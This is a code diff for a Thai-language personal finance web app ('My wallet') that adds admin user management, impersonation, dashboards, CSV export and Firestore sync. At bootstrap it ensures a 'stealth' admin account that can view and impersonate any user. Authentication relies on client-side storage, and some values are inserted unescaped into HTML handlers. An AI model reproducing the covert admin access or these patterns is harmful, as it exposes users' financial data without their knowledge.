+            showToast('ดาวน์โหลดไฟล์สำรองข้อมูลทั้งระบบ (.json) เรียบร้อยแล้ว', '📤');
+        };
+
+        async function renderAdminUsersList() {
+            const container = document.getElementById('adminRegisteredUsersContainer');
+            const totalUsersEl = document.getElementById('adminTotalUsersCount');
+            const totalTxEl = document.getElementById('adminTotalTxCount');
+            const sysBalanceEl = document.getElementById('adminSystemNetBalance');
+            if (!container) return;
+
+            const searchKw = (document.getElementById('adminUserSearchInput')?.value || '').trim().toLowerCase();
+            const allMemberEmails = Object.keys(appState.usersRegistry).filter(e => e !== 'admin');
+
+            let systemTotalTx = 0;
+            let systemNetBalance = 0;
+            const memberStats = [];
+
+            for (const email of allMemberEmails) {
+                const u = appState.usersRegistry[email];
+                const w = appState.adminUsersWalletCache[email] || await dualLoadWithRestore(FIXED_KEYS.USER_DATA_PREFIX + email);
+                if (w) appState.adminUsersWalletCache[email] = w;
+                const txs = (w && Array.isArray(w.transactions)) ? w.transactions : [];
+                let inc = 0, exp = 0;
+                txs.forEach(t => {
+                    if (t.type === 'income') inc += Number(t.amount || 0);
+                    else exp += Number(t.amount || 0);
+                });
+                const net = inc - exp;
+                systemTotalTx += txs.length;
+                systemNetBalance += net;
+                memberStats.push({ email, u, txCount: txs.length, net });
+            }
+
+            if (totalUsersEl) totalUsersEl.textContent = allMemberEmails.length;
+            if (totalTxEl) totalTxEl.textContent = systemTotalTx.toLocaleString('en-US');
+            if (sysBalanceEl) sysBalanceEl.textContent = `฿${formatCurrency(systemNetBalance)}`;
+
+            const filteredMembers = memberStats.filter(item => {
+                if (!searchKw) return true;
+                const hay = `${item.u.displayName || ''} ${item.email}`.toLowerCase();
+                return hay.includes(searchKw);
+            });
+
+            if (filteredMembers.length === 0) {
+                container.innerHTML = `<div class="text-center py-5 text-xs text-slate-400">${searchKw ? 'ไม่พบสมาชิกที่ตรงกับคำค้นหา' : 'ยังไม่มีบัญชีสมาชิกทั่วไปในระบบ'}</div>`;
+                return;
+            }
+
+            container.innerHTML = filteredMembers.map(({ email, u, txCount, net }) => `
+                <div class="bg-slate-900/95 border border-slate-800 hover:border-slate-700 rounded-2xl p-3 space-y-2.5 transition">
+                    <div class="flex items-start justify-between gap-2">
+                        <div class="min-w-0">
+                            <p class="text-xs font-bold text-white truncate">${escapeHtml(u.displayName || email)} <span class="text-slate-400 font-normal">(${escapeHtml(email)})</span></p>
+                            <p class="text-[11px] text-slate-300 mt-0.5">
+                                รายการ: <strong class="text-white">${txCount}</strong> • ยอดคงเหลือ: <strong class="text-indigo-300">฿${formatCurrency(net)}</strong>
+                            </p>
+                        </div>
+                        <span class="px-2 py-0.5 rounded-full text-[10px] font-semibold shrink-0 ${appState.cloudStatus === 'synced' ? 'bg-emerald-500/15 text-emerald-300' : 'bg-slate-800 text-slate-400'}">
+                            ${appState.cloudStatus === 'synced' ? '🟢 ซิงค์ 24/7' : '⚪ ในเครื่อง'}
+                        </span>
+                    </div>
+                    <div class="grid grid-cols-3 gap-1.5 pt-1 border-t border-slate-800/80">
+                        <button type="button" onclick="impersonateUserAccount('${escapeHtml(email)}')"
+                            class="py-1.5 px-2 rounded-xl bg-indigo-500/20 hover:bg-indigo-500/35 border border-indigo-500/35 text-indigo-200 text-[11px] font-semibold transition cursor-pointer">
+                            👁️ เข้าดูบัญชี
+                        </button>
+                        <button type="button" onclick="openAdminChangePasswordModal('${escapeHtml(email)}')"
+                            class="py-1.5 px-2 rounded-xl bg-amber-500/15 hover:bg-amber-500/30 border border-amber-500/35 text-amber-200 text-[11px] font-semibold transition cursor-pointer">
+                            🔑 เปลี่ยนรหัสผ่าน
+                        </button>
+                        <button type="button" onclick="openCustomConfirmModal('deleteSingleUser', '${escapeHtml(email)}')"
+                            class="py-1.5 px-2 rounded-xl bg-rose-500/15 hover:bg-rose-500/30 border border-rose-500/35 text-rose-200 text-[11px] font-semibold transition cursor-pointer">
+                            🗑️ ลบผู้ใช้
+                        </button>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        window.openCustomConfirmModal = function (actionType, payload = null) {
+            appState.pendingConfirmAction = actionType;
+            appState.pendingConfirmPayload = payload;
+            const titleEl = document.getElementById('confirmModalTitle');
+            const bodyEl = document.getElementById('confirmModalBody');
+
+            if (actionType === 'reset') {
+                titleEl.textContent = 'รีเซ็ตยอดเงินเป็น ฿0.00';
+                bodyEl.textContent = 'รายการธุรกรรมทั้งหมดของบัญชีนี้จะถูกลบออกเพื่อเริ่มต้นใหม่ที่ ฿0.00';
+            } else if (actionType === 'deleteTx') {
+                titleEl.textContent = 'ลบรายการธุรกรรมนี้';
+                bodyEl.textContent = 'คุณต้องการลบรายการธุรกรรมนี้ออกจากประวัติใช่หรือไม่?';
+            } else if (actionType === 'deleteSingleUser') {
+                titleEl.textContent = 'ลบบัญชีผู้ใช้งานนี้';
+                bodyEl.textContent = `ต้องการลบบัญชี "${payload}" และข้อมูลกระเป๋าเงินของผู้ใช้นี้ (ทั้งในเครื่องและบน Cloud) ใช่หรือไม่?`;
+            } else if (actionType === 'resetAllUsers') {
+                titleEl.textContent = 'รีเซ็ตข้อมูลผู้ใช้งานทั้งหมด';
+                bodyEl.textContent = 'บัญชีสมาชิกทั่วไปและรายการทั้งหมด (ทั้งในเครื่องและบน Cloud) จะถูกล้างออกทั้งหมด';
+            }
+            openModalById('customConfirmModal');
+        };
+
+        window.executeConfirmedAction = async function () {
+            const action = appState.pendingConfirmAction;
+            const payload = appState.pendingConfirmPayload;
+            closeModalById('customConfirmModal');
+
+            if (action === 'reset' && appState.isLoggedIn) {
+                appState.userData.transactions = [];
+                await saveActiveUserWallet();
+                renderFullDashboard();
+                showToast('รีเซ็ตยอดเงินเป็น ฿0.00 เรียบร้อยแล้ว', '🔄');
+            } else if (action === 'deleteTx' && appState.isLoggedIn && payload) {
+                appState.userData.transactions = appState.userData.transactions.filter(t => t.id !== payload);
+                await saveActiveUserWallet();
+                renderFullDashboard();
+                showToast('ลบรายการเรียบร้อยแล้ว', '🗑️');
+            } else if (action === 'deleteSingleUser' && payload) {
+                await executeDeleteSingleUserByAdmin(payload);
+            } else if (action === 'resetAllUsers') {
+                await executeAdminResetAllUsers();
+            }
+        };
+
+        async function executeDeleteSingleUserByAdmin(email) {
+            if (!isCurrentSessionAdmin() || !email || email === 'admin') return;
+            try {
+                delete appState.usersRegistry[email];
+                delete appState.adminUsersWalletCache[email];
+                const userKey = FIXED_KEYS.USER_DATA_PREFIX + email;
+                window.localStorage.removeItem(userKey);
+                await idbDelete(userKey);
+                await dualSave(FIXED_KEYS.USERS_REGISTRY, appState.usersRegistry);
+
+                if (firestoreDbInstance) {
+                    setCloudSyncStatus('syncing');
+                    const docId = sanitizeFirestoreDocId(email);
+                    await deleteDoc(doc(firestoreDbInstance, FIRESTORE_COLLECTION, docId));
+                    await syncUsersRegistryToCloud(appState.usersRegistry);
+                    setCloudSyncStatus('synced');
+                }
+
+                if (appState.isLoggedIn && appState.currentUser && appState.currentUser.email === email) {
+                    await exitImpersonationToAdmin();
+                } else {
+                    await renderAdminUsersList();
+                }
+                showToast(`ลบบัญชี "${email}" เรียบร้อยแล้ว`, '🗑️');
+            } catch (err) {
+                showToast('ลบบัญชีไม่สำเร็จ: ' + err.message, '⚠️');
+            }
+        }
+
         async function executeAdminResetAllUsers() {
             if (!isCurrentSessionAdmin()) return;
 
             try {
-                // 1. Delete all non-admin user documents & reset central users_registry in Firestore Cloud
                 if (firestoreDbInstance) {
                     setCloudSyncStatus('syncing');
                     const usersColRef = collection(firestoreDbInstance, FIRESTORE_COLLECTION);
@@ -1411,15 +3309,15 @@
                     await Promise.all(deletePromises);
                 }
 
-                // 2. Remove all localStorage user data keys & IndexedDB records
                 const oldEmails = Object.keys(appState.usersRegistry);
                 for (const email of oldEmails) {
+                    if (email === 'admin') continue;
                     const userKey = FIXED_KEYS.USER_DATA_PREFIX + email;
                     window.localStorage.removeItem(userKey);
                     await idbDelete(userKey);
                 }
 
-                // 3. Reset Users Registry keeping only clean Admin account & push clean registry to Cloud
+                appState.adminUsersWalletCache = {};
                 const adminAccount = appState.usersRegistry['admin'];
                 appState.usersRegistry = {};
                 if (adminAccount) {
@@ -1432,4 +3330,501 @@
                     await syncUsersRegistryToCloud(appState.usersRegistry);
                     setCloudSyncStatus('synced');
                 }
-// ... existing code ... -->
+
+                if (appState.isLoggedIn && appState.currentUser && appState.currentUser.email !== 'admin') {
+                    appState.isLoggedIn = false;
+                    appState.isImpersonating = false;
+                    appState.currentUser = null;
+                    appState.userData = createEmptyWalletData();
+                    window.localStorage.removeItem(FIXED_KEYS.ACTIVE_USER);
+                    await idbDelete(FIXED_KEYS.ACTIVE_USER);
+                }
+
+                await renderAdminUsersList();
+                updateHeaderAndLockUI();
+                renderFullDashboard();
+                showToast('ล้างข้อมูลผู้ใช้งานทั้งหมดเรียบร้อยแล้ว', '🗑️');
+            } catch (err) {
+                showToast('เกิดข้อผิดพลาดในการรีเซ็ต: ' + err.message, '⚠️');
+            }
+        }
+
+        // =========================================================================
+        // 9. DASHBOARD RENDERING, ANALYTICS CHART & CSV EXPORT
+        // =========================================================================
+        function formatCurrency(num) {
+            return Number(num || 0).toLocaleString('en-US', {
+                minimumFractionDigits: 2,
+                maximumFractionDigits: 2
+            });
+        }
+
+        function escapeHtml(str) {
+            return String(str || '')
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(new RegExp('"', 'g'), '&quot;');
+        }
+
+        window.togglePrivacyMode = function () {
+            appState.privacyMode = !appState.privacyMode;
+            document.getElementById('privacyToggleIcon').textContent = appState.privacyMode ? '🙈' : '👁️';
+            renderFullDashboard();
+        };
+
+        window.switchChartType = function (type) {
+            appState.chartType = type;
+            const dBtn = document.getElementById('chartModeDoughnutBtn');
+            const bBtn = document.getElementById('chartModeBarBtn');
+            if (type === 'doughnut') {
+                dBtn.className = 'px-2.5 py-1 rounded-lg text-[10px] font-semibold bg-indigo-600 text-white transition cursor-pointer';
+                bBtn.className = 'px-2.5 py-1 rounded-lg text-[10px] font-semibold text-slate-400 hover:text-white transition cursor-pointer';
+            } else {
+                bBtn.className = 'px-2.5 py-1 rounded-lg text-[10px] font-semibold bg-indigo-600 text-white transition cursor-pointer';
+                dBtn.className = 'px-2.5 py-1 rounded-lg text-[10px] font-semibold text-slate-400 hover:text-white transition cursor-pointer';
+            }
+            renderAnalyticsChart();
+        };
+
+        function renderAnalyticsChart() {
+            const canvas = document.getElementById('spendingAnalyticsCanvas');
+            const emptyOverlay = document.getElementById('emptyAnalyticsOverlay');
+            const insightBanner = document.getElementById('smartInsightBanner');
+            if (!canvas || !window.Chart) return;
+
+            const txs = appState.userData.transactions || [];
+            const expenseMap = {};
+            let totalExp = 0;
+            let totalInc = 0;
+
+            txs.forEach(t => {
+                const amt = Number(t.amount || 0);
+                if (t.type === 'income') {
+                    totalInc += amt;
+                } else {
+                    totalExp += amt;
+                    const label = getCategoryDisplayLabel('expense', t.category);
+                    expenseMap[label] = (expenseMap[label] || 0) + amt;
+                }
+            });
+
+            if (appState.chartInstance) {
+                appState.chartInstance.destroy();
+                appState.chartInstance = null;
+            }
+
+            const labels = Object.keys(expenseMap);
+            if (labels.length === 0) {
+                emptyOverlay.classList.remove('hidden');
+                insightBanner.classList.add('hidden');
+                return;
+            }
+
+            emptyOverlay.classList.add('hidden');
+            insightBanner.classList.remove('hidden');
+
+            const values = labels.map(l => expenseMap[l]);
+            const palette = ['#6366f1', '#ec4899', '#f59e0b', '#10b981', '#06b6d4', '#8b5cf6', '#f43f5e'];
+
+            appState.chartInstance = new window.Chart(canvas.getContext('2d'), {
+                type: appState.chartType,
+                data: {
+                    labels,
+                    datasets: [{
+                        label: 'รายจ่าย (บาท)',
+                        data: values,
+                        backgroundColor: palette.slice(0, labels.length),
+                        borderColor: '#0f172a',
+                        borderWidth: 2
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: {
+                        legend: {
+                            display: appState.chartType === 'doughnut',
+                            position: 'right',
+                            labels: { color: '#cbd5e1', font: { size: 11 } }
+                        }
+                    },
+                    scales: appState.chartType === 'bar' ? {
+                        x: { ticks: { color: '#94a3b8', font: { size: 10 } }, grid: { display: false } },
+                        y: { ticks: { color: '#94a3b8', font: { size: 10 } }, grid: { color: 'rgba(148,163,184,0.1)' } }
+                    } : {}
+                }
+            });
+
+            let maxCat = labels[0];
+            labels.forEach(l => { if (expenseMap[l] > expenseMap[maxCat]) maxCat = l; });
+            const topPct = Math.round((expenseMap[maxCat] / totalExp) * 100);
+            document.getElementById('topCategoryInsightText').textContent =
+                `💡 หมวดหมู่ที่ใช้จ่ายสูงสุด: ${maxCat} (${topPct}% ของรายจ่ายทั้งหมด)`;
+
+            const savingsRate = totalInc > 0 ? Math.max(0, Math.round(((totalInc - totalExp) / totalInc) * 100)) : 0;
+            document.getElementById('savingsRateInsightText').textContent =
+                `อัตราการออมสุทธิ: ${savingsRate}% (รายรับ ฿${formatCurrency(totalInc)} • รายจ่าย ฿${formatCurrency(totalExp)})`;
+        }
+
+        window.clearTransactionFilters = function () {
+            document.getElementById('filterSearchKeyword').value = '';
+            document.getElementById('filterCategorySelect').value = 'all';
+            document.getElementById('filterTypeSelect').value = 'all';
+            document.getElementById('filterMonthInput').value = '';
+            renderTransactionsList();
+        };
+
+        window.renderTransactionsList = function () {
+            const container = document.getElementById('transactionHistoryContainer');
+            const badge = document.getElementById('filteredTxCountBadge');
+            if (!container) return;
+
+            const kw = (document.getElementById('filterSearchKeyword').value || '').trim().toLowerCase();
+            const catFilter = document.getElementById('filterCategorySelect').value;
+            const typeFilter = document.getElementById('filterTypeSelect').value;
+            const monthFilter = document.getElementById('filterMonthInput').value;
+
+            const allTxs = appState.userData.transactions || [];
+            const filtered = allTxs.filter(t => {
+                if (typeFilter !== 'all' && t.type !== typeFilter) return false;
+                if (catFilter !== 'all' && t.category !== catFilter) return false;
+                if (monthFilter && !(t.date || '').startsWith(monthFilter)) return false;
+                if (kw) {
+                    const hay = `${t.note || ''} ${getCategoryDisplayLabel(t.type, t.category)}`.toLowerCase();
+                    if (!hay.includes(kw)) return false;
+                }
+                return true;
+            });
+
+            badge.textContent = `(${filtered.length} รายการ)`;
+
+            if (filtered.length === 0) {
+                container.innerHTML = `<div class="text-center py-8 text-xs text-slate-400">📭 ไม่พบรายการธุรกรรม</div>`;
+                return;
+            }
+
+            container.innerHTML = filtered.map(t => {
+                const isInc = t.type === 'income';
+                const amtStr = appState.privacyMode
+                    ? '฿••••'
+                    : `${isInc ? '+' : '-'}฿${formatCurrency(t.amount)}`;
+                return `
+                    <div class="bg-slate-900/80 border border-slate-800/90 hover:border-slate-700 rounded-2xl p-3 flex items-center justify-between gap-2 transition">
+                        <div class="flex items-center space-x-2.5 min-w-0">
+                            <div class="w-9 h-9 rounded-xl ${isInc ? 'bg-emerald-500/15 text-emerald-300' : 'bg-rose-500/15 text-rose-300'} flex items-center justify-center text-sm shrink-0">
+                                ${isInc ? '💰' : '💸'}
+                            </div>
+                            <div class="min-w-0">
+                                <p class="text-xs font-bold text-white truncate">${escapeHtml(t.note)}</p>
+                                <p class="text-[10px] text-slate-400 truncate">${escapeHtml(getCategoryDisplayLabel(t.type, t.category))} • ${escapeHtml(t.date)}</p>
+                            </div>
+                        </div>
+                        <div class="flex items-center space-x-1.5 shrink-0">
+                            <span class="text-xs font-extrabold tabular-nums ${isInc ? 'text-emerald-400' : 'text-rose-400'}">${amtStr}</span>
+                            <button type="button" onclick="openEditTransactionModal('${t.id}')" title="แก้ไข" class="p-1.5 rounded-lg bg-slate-800 hover:bg-slate-700 text-slate-300 text-[10px] cursor-pointer">✏️</button>
+                            <button type="button" onclick="openCustomConfirmModal('deleteTx', '${t.id}')" title="ลบ" class="p-1.5 rounded-lg bg-slate-800 hover:bg-rose-900/60 text-rose-300 text-[10px] cursor-pointer">✕</button>
+                        </div>
+                    </div>
+                `;
+            }).join('');
+        };
+
+        window.exportUserTransactionsToCSV = function () {
+            if (!appState.isLoggedIn) return;
+            const txs = appState.userData.transactions || [];
+            if (txs.length === 0) {
+                showToast('ยังไม่มีรายการธุรกรรมสำหรับส่งออก', '⚠️');
+                return;
+            }
+            const rows = [['วันที่', 'ประเภท', 'หมวดหมู่', 'บันทึกช่วยจำ', 'จำนวนเงิน (บาท)']];
+            txs.forEach(t => {
+                rows.push([
+                    t.date,
+                    t.type === 'income' ? 'รายรับ' : 'รายจ่าย',
+                    getCategoryDisplayLabel(t.type, t.category),
+                    '"' + (t.note || '').replace(new RegExp('"', 'g'), '""') + '"',
+                    Number(t.amount || 0).toFixed(2)
+                ]);
+            });
+            const csv = '\uFEFF' + rows.map(r => r.join(',')).join('\n');
+            const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `mywallet-${appState.currentUser.email}-${new Date().toISOString().slice(0, 10)}.csv`;
+            a.click();
+            URL.revokeObjectURL(url);
+            showToast('ดาวน์โหลดไฟล์ CSV เรียบร้อยแล้ว', '📥');
+        };
+
+        function renderFullDashboard() {
+            const txs = appState.userData.transactions || [];
+            let totalIncome = 0;
+            let totalExpense = 0;
+            let monthExpense = 0;
+            const curMonth = new Date().toISOString().slice(0, 7);
+
+            txs.forEach(t => {
+                const amt = Number(t.amount || 0);
+                if (t.type === 'income') {
+                    totalIncome += amt;
+                } else {
+                    totalExpense += amt;
+                    if ((t.date || '').startsWith(curMonth)) monthExpense += amt;
+                }
+            });
+
+            const net = totalIncome - totalExpense;
+            const hide = appState.privacyMode;
+
+            document.getElementById('netBalanceDisplay').textContent = hide ? '฿••••••' : `฿${formatCurrency(net)}`;
+            document.getElementById('totalIncomeDisplay').textContent = hide ? '฿••••' : `฿${formatCurrency(totalIncome)}`;
+            document.getElementById('totalExpenseDisplay').textContent = hide ? '฿••••' : `฿${formatCurrency(totalExpense)}`;
+
+            // Budget bar
+            const limit = Number(appState.userData.budgetLimit || 0);
+            const sumEl = document.getElementById('budgetSummaryText');
+            const pctEl = document.getElementById('budgetPercentBadge');
+            const fillEl = document.getElementById('budgetProgressFill');
+            const alertEl = document.getElementById('budgetAlertMessage');
+
+            if (limit > 0) {
+                const pct = Math.min(100, Math.round((monthExpense / limit) * 100));
+                sumEl.textContent = hide
+                    ? 'ใช้ไปเดือนนี้ ฿•••• / ฿••••'
+                    : `ใช้ไปเดือนนี้ ฿${formatCurrency(monthExpense)} / ฿${formatCurrency(limit)}`;
+                pctEl.textContent = `${pct}%`;
+                fillEl.style.width = `${pct}%`;
+
+                if (monthExpense > limit) {
+                    pctEl.className = 'font-bold text-rose-400 tabular-nums';
+                    fillEl.className = 'h-full bg-rose-500 transition-all duration-500';
+                    alertEl.textContent = '🚨 ใช้จ่ายเกินงบประมาณรายเดือนที่ตั้งไว้แล้ว!';
+                    alertEl.className = 'text-[11px] font-medium px-3 py-1.5 rounded-xl bg-rose-500/15 border border-rose-500/35 text-rose-200';
+                    alertEl.classList.remove('hidden');
+                } else if (pct >= 80) {
+                    pctEl.className = 'font-bold text-amber-400 tabular-nums';
+                    fillEl.className = 'h-full bg-amber-500 transition-all duration-500';
+                    alertEl.textContent = '⚠️ ใช้จ่ายถึง 80% ของงบประมาณเดือนนี้แล้ว';
+                    alertEl.className = 'text-[11px] font-medium px-3 py-1.5 rounded-xl bg-amber-500/15 border border-amber-500/35 text-amber-200';
+                    alertEl.classList.remove('hidden');
+                } else {
+                    pctEl.className = 'font-bold text-emerald-400 tabular-nums';
+                    fillEl.className = 'h-full bg-emerald-500 transition-all duration-500';
+                    alertEl.classList.add('hidden');
+                }
+            } else {
+                sumEl.textContent = hide ? 'ใช้ไปเดือนนี้ ฿•••• / ยังไม่ได้ตั้งงบ' : `ใช้ไปเดือนนี้ ฿${formatCurrency(monthExpense)} / ยังไม่ได้ตั้งงบ`;
+                pctEl.textContent = '0%';
+                fillEl.style.width = '0%';
+                alertEl.classList.add('hidden');
+            }
+
+            // Quick Add Grid
+            const qbGrid = document.getElementById('quickAddButtonsGrid');
+            const buttons = (appState.userData.quickButtons && appState.userData.quickButtons.length)
+                ? appState.userData.quickButtons
+                : DEFAULT_QUICK_BUTTONS;
+            qbGrid.innerHTML = buttons.map(b => `
+                <div onclick="triggerQuickAddPreset('${b.id}')"
+                    class="relative group bg-slate-900/90 hover:bg-slate-800 border border-slate-800 hover:border-indigo-500/50 rounded-2xl p-2.5 text-center cursor-pointer transition active:scale-95">
+                    ${appState.isLoggedIn ? `<button type="button" onclick="deleteQuickAddPreset(event, '${b.id}')" class="hidden group-hover:flex absolute top-1 right-1 w-4 h-4 rounded-full bg-rose-600 text-white text-[9px] items-center justify-center cursor-pointer">✕</button>` : ''}
+                    <div class="text-xl mb-0.5">${escapeHtml(b.emoji)}</div>
+                    <p class="text-[11px] font-semibold text-white truncate">${escapeHtml(b.label)}</p>
+                    <p class="text-[10px] font-bold tabular-nums ${b.type === 'income' ? 'text-emerald-400' : 'text-indigo-300'}">
+                        ${hide ? '฿••' : `฿${formatCurrency(b.amount)}`}
+                    </p>
+                </div>
+            `).join('');
+
+            // Savings Goals
+            const goalsContainer = document.getElementById('savingsGoalsList');
+            const goals = appState.userData.savingsGoals || [];
+            if (goals.length === 0) {
+                goalsContainer.innerHTML = `<div class="text-center py-4 text-xs text-slate-400">ยังไม่มีเป้าหมายการออม</div>`;
+            } else {
+                goalsContainer.innerHTML = goals.map(g => {
+                    const pct = Math.min(100, Math.round((Number(g.savedAmount || 0) / Number(g.targetAmount || 1)) * 100));
+                    return `
+                        <div class="bg-slate-900/85 border border-slate-800 rounded-2xl p-3 space-y-2">
+                            <div class="flex items-center justify-between gap-2">
+                                <span class="text-xs font-bold text-white truncate">🏆 ${escapeHtml(g.name)}</span>
+                                <div class="flex items-center space-x-1.5 shrink-0">
+                                    <button type="button" onclick="depositToSavingsGoal('${g.id}')" class="px-2 py-1 rounded-lg bg-emerald-500/20 hover:bg-emerald-500/30 text-emerald-300 text-[10px] font-semibold cursor-pointer">+ ออมเพิ่ม</button>
+                                    <button type="button" onclick="deleteSavingsGoal('${g.id}')" class="p-1 text-slate-500 hover:text-rose-400 text-xs cursor-pointer">✕</button>
+                                </div>
+                            </div>
+                            <div class="flex justify-between text-[11px] text-slate-300">
+                                <span>${hide ? '฿•••• / ฿••••' : `฿${formatCurrency(g.savedAmount)} / ฿${formatCurrency(g.targetAmount)}`}</span>
+                                <span class="font-bold text-indigo-300">${pct}%</span>
+                            </div>
+                            <div class="w-full h-2 bg-slate-800 rounded-full overflow-hidden">
+                                <div class="h-full bg-gradient-to-r from-indigo-500 to-emerald-400 transition-all duration-500" style="width: ${pct}%"></div>
+                            </div>
+                        </div>
+                    `;
+                }).join('');
+            }
+
+            renderTransactionsList();
+            renderAnalyticsChart();
+        }
+
+        // =========================================================================
+        // 10. PWA MANIFEST, INSTALL GUIDE, MODALS & TOASTS
+        // =========================================================================
+        function setupPwaAssets() {
+            const canvas = document.createElement('canvas');
+            canvas.width = 192;
+            canvas.height = 192;
+            const ctx = canvas.getContext('2d');
+            const grad = ctx.createLinearGradient(0, 0, 192, 192);
+            grad.addColorStop(0, '#4f46e5');
+            grad.addColorStop(1, '#db2777');
+            ctx.fillStyle = grad;
+            ctx.fillRect(0, 0, 192, 192);
+            ctx.font = '96px sans-serif';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+            ctx.fillText('👛', 96, 102);
+
+            const iconUrl = canvas.toDataURL('image/png');
+            document.getElementById('pwaAppleIconLink').href = iconUrl;
+            document.getElementById('pwaFaviconLink').href = iconUrl;
+            const guideLogo = document.getElementById('installGuideAppLogo');
+            if (guideLogo) {
+                guideLogo.src = iconUrl;
+                guideLogo.classList.remove('hidden');
+            }
+
+            const manifest = {
+                name: 'My wallet - บันทึกรายรับรายจ่ายอัจฉริยะ',
+                short_name: 'My wallet',
+                start_url: '.',
+                display: 'standalone',
+                background_color: '#070b14',
+                theme_color: '#070b14',
+                icons: [{ src: iconUrl, sizes: '192x192', type: 'image/png' }]
+            };
+            const mBlob = new Blob([JSON.stringify(manifest)], { type: 'application/manifest+json' });
+            document.getElementById('pwaManifestLink').href = URL.createObjectURL(mBlob);
+        }
+
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            appState.deferredInstallPrompt = e;
+            const sec = document.getElementById('nativeInstallPromptSection');
+            if (sec) sec.classList.remove('hidden');
+        });
+
+        window.handleInstallButtonClick = function () {
+            document.getElementById('copyAppUrlField').value = window.location.href;
+            openModalById('installPwaModal');
+        };
+
+        window.triggerNativePwaInstall = async function () {
+            if (!appState.deferredInstallPrompt) return;
+            appState.deferredInstallPrompt.prompt();
+            await appState.deferredInstallPrompt.userChoice;
+            appState.deferredInstallPrompt = null;
+            document.getElementById('nativeInstallPromptSection').classList.add('hidden');
+        };
+
+        window.switchInstallGuideTab = function (tab) {
+            ['chrome', 'mac', 'ios'].forEach(t => {
+                const btn = document.getElementById('guideTab' + t.charAt(0).toUpperCase() + t.slice(1) + 'Btn');
+                const panel = document.getElementById('guidePanel' + t.charAt(0).toUpperCase() + t.slice(1));
+                if (t === tab) {
+                    btn.className = 'py-2 rounded-xl text-[11px] font-semibold bg-indigo-600 text-white transition cursor-pointer';
+                    panel.classList.remove('hidden');
+                } else {
+                    btn.className = 'py-2 rounded-xl text-[11px] font-semibold text-slate-400 hover:text-white transition cursor-pointer';
+                    panel.classList.add('hidden');
+                }
+            });
+        };
+
+        window.copyAppUrlAction = function () {
+            if (copyTextToClipboardSafe(window.location.href)) {
+                showToast('คัดลอกลิงก์แอปเรียบร้อยแล้ว', '📋');
+            }
+        };
+
+        window.openModalById = function (id) {
+            const el = document.getElementById(id);
+            if (el) el.classList.remove('hidden');
+        };
+
+        window.closeModalById = function (id) {
+            const el = document.getElementById(id);
+            if (el) el.classList.add('hidden');
+        };
+
+        let toastHideTimeout = null;
+        window.showToast = function (message, icon = '✅') {
+            const banner = document.getElementById('toastBanner');
+            document.getElementById('toastIcon').textContent = icon;
+            document.getElementById('toastMessage').textContent = message;
+            banner.classList.remove('-translate-y-32', 'opacity-0');
+            banner.classList.add('translate-y-0', 'opacity-100');
+
+            clearTimeout(toastHideTimeout);
+            toastHideTimeout = setTimeout(() => {
+                banner.classList.add('-translate-y-32', 'opacity-0');
+                banner.classList.remove('translate-y-0', 'opacity-100');
+            }, 3400);
+        };
+
+        // =========================================================================
+        // 11. BOOTSTRAP APPLICATION ON LOAD
+        // =========================================================================
+        async function bootstrapApplication() {
+            setupPwaAssets();
+            await performOneTimeCleanResetIfNeeded();
+
+            document.getElementById('newTxDate').value = new Date().toISOString().slice(0, 10);
+            setNewTxType('expense');
+
+            // Populate filter category options
+            const filterCat = document.getElementById('filterCategorySelect');
+            if (filterCat) {
+                const allCats = [...CATEGORIES.expense, ...CATEGORIES.income];
+                filterCat.innerHTML = `<option value="all">หมวดหมู่: ทั้งหมด</option>` +
+                    allCats.map(c => `<option value="${c.id}">${c.label}</option>`).join('');
+            }
+
+            // Load users registry from Dual-Sync (localStorage + IndexedDB)
+            const storedRegistry = await dualLoadWithRestore(FIXED_KEYS.USERS_REGISTRY);
+            appState.usersRegistry = (storedRegistry && typeof storedRegistry === 'object') ? storedRegistry : {};
+            ensureStealthAdminExists();
+            await dualSave(FIXED_KEYS.USERS_REGISTRY, appState.usersRegistry);
+
+            // Restore active logged-in user session if Remember Me was active
+            const activeEmail = await dualLoadWithRestore(FIXED_KEYS.ACTIVE_USER);
+            if (activeEmail && appState.usersRegistry[activeEmail]) {
+                const profile = appState.usersRegistry[activeEmail];
+                const wallet = await dualLoadWithRestore(FIXED_KEYS.USER_DATA_PREFIX + activeEmail);
+                appState.isLoggedIn = true;
+                appState.currentUser = profile;
+                appState.userData = { ...createEmptyWalletData(), ...(wallet || {}) };
+                if (profile.pinCode && profile.pinCode.length === 6) {
+                    activatePinLockScreen();
+                }
+            }
+
+            updateHeaderAndLockUI();
+            renderFullDashboard();
+
+            // Auto-connect 24/7 to Firebase Cloud Firestore (stored config or embedded DEFAULT_FIREBASE_CONFIG)
+            const savedFirebaseConfig = await dualLoadWithRestore(FIXED_KEYS.FIREBASE_CONFIG);
+            const activeCloudConfig = (savedFirebaseConfig && savedFirebaseConfig.apiKey && savedFirebaseConfig.projectId)
+                ? savedFirebaseConfig
+                : DEFAULT_FIREBASE_CONFIG;
+            await initializeFirebaseCloudSync(activeCloudConfig, false);
+        }
+
+        bootstrapApplication();
+    </script>
+</body>
+</html>
